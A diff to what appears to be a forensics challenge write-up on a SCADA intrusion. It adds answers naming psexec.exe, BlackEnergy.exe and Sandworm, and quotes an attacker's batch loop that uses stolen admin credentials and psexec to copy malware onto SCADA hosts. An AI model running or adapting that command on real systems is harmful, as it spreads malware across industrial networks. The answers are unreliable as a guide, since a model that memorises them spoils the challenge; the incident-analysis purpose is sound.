@@ -72,15 +72,23 @@ for /F 'tokens=1' %i in (C:\\ProgramData
 
 **Q9. What legitimate Windows tool was exploited to carry out these remote executions?**<br><br>
 
-**Answer: **<br><br>
+```
+for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
+  set /p password=<C:\\ProgramData\\Extracted_Password.txt
+  psexec.exe \\%i -u administrator -p %password% cmd /c "copy C:\\malware\\BlackEnergy.exe \\%i\\SCADA\\BlackEnergy.exe"
+)
+```
+<br>
 
-**Q. **<br><br>
+**Answer:  psexec.exe**<br><br>
 
-**Answer: **<br><br>
+**Q10. What executable did the theat actor use to establish persistence and perform reconnaissance on the SCADA systems during the attack?**<br><br>
 
-**Q. **<br><br>
+**Answer: BlackEnergy.exe**<br><br>
 
-**Answer: **<br><br>
+**Q11. What is the name of the group responsible for these attacks?**<br><br>
+
+**Answer: Sandworm**<br><br>
 
 **Q. **<br><br>
 
